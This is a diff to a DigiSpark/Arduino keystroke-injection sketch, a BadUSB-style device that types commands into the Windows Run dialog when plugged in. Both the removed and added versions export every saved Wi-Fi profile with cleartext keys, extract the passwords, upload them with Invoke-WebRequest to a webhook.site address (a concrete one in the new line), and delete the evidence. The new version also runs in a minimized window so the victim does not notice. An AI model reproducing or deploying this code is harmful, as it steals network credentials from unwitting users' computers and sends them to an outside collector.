@@ -19,30 +19,33 @@ void loop() {
   DigiKeyboard.delay(3000);
  
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
-  DigiKeyboard.delay(100);
-  DigiKeyboard.println("cmd /k mode con: cols=15 lines=1"); //smallest cmd window possible
-  DigiKeyboard.delay(500);
-  DigiKeyboard.delay(500);
-  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_ALT_LEFT); //Menu  
-  DigiKeyboard.sendKeyStroke(KEY_M); //goto Move
-  for(int i =0; i < 100; i++)
-    {
-      DigiKeyboard.sendKeyStroke(KEY_DOWN);
-    }
-  DigiKeyboard.sendKeyStroke(KEY_ENTER); //Detach from scrolling
-  DigiKeyboard.delay(100);
-  DigiKeyboard.println("cd %temp%"); //going to temporary dir
-  DigiKeyboard.delay(500);
-  DigiKeyboard.println("netsh wlan export profile key=clear"); //grabbing all the saved wifi passwd and saving them in temporary dir
-  DigiKeyboard.delay(500);
-  DigiKeyboard.println("powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS"); //Extracting all password and saving them in Wi-Fi-Pass file in temporary dir
-  DigiKeyboard.delay(500);
-  DigiKeyboard.println("powershell Invoke-WebRequest -Uri https://webhook.site/<ADD-WEBHOOK-ADDRESS-HERE> -Method POST -InFile Wi-Fi-PASS"); //Submitting all passwords on hook
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.println("del Wi-* /s /f /q"); //cleaning up all the mess
-  DigiKeyboard.delay(100);
-  DigiKeyboard.println("exit");
-  DigiKeyboard.delay(100);
+  DigiKeyboard.delay(100); 
+  
+  //do all the cool stuff wo delays && minimized
+  /* 
+    cmd /c start /min cmd /q /c "..."
+    :: starts a new minimized console window that closes after finishing the code "..."
+    
+    cd %temp% & md w & cd w 
+    :: create and enter %temp%\w
+    
+    netsh wlan export profile key=clear 
+    :: export wifi info to xml
+    
+    findstr ial * >> p 
+    :: find all lines in all files that contain ial as in keyMaterial
+    :: not spelling it out bc there is a character limit in the run.exe window
+    :: that's also why we use findstr here instead of the powershell function
+    
+    powershell Invoke-WebRequest -Uri https://webhook.site/<YOUR-ID> -Method Post -InFile p 
+    :: send file to webhook
+      
+    cd .. & rd w /s /q
+    :: clean up 
+    
+  */
+  DigiKeyboard.println("cmd /c start /min cmd /q /c \"cd %temp% & md w & cd w & netsh wlan export profile key=clear & findstr ial * >> p & powershell Invoke-WebRequest -Uri https://webhook.site/73683655-e294-488f-82d1-754435266cb2 -Method Post -InFile p & cd .. & rd w /s /q\""); 
+  
   
   digitalWrite(1, HIGH); //turn on led when program finishes
   DigiKeyboard.delay(90000);
